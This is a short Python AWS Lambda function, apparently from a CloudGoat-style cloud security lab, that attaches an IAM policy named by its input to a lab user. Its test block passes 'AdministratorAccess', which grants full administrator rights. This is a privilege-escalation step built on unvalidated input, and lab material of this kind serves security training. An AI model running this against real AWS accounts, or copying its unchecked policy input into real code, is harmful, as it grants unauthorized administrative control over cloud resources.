import boto3

client = boto3.client('iam')

def handler(event, context): 
    
    response = client.attach_user_policy(
        UserName='cg-bilbo-lambda_sql_injection_cgid0kecwx1ycg',
        PolicyArn=f'arn:aws:iam::aws:policy/{event}'
        )

    return { 
        'message' : f"{response}"
    }
    
if __name__ == "__main__":
    print(handler('AdministratorAccess','gurt'))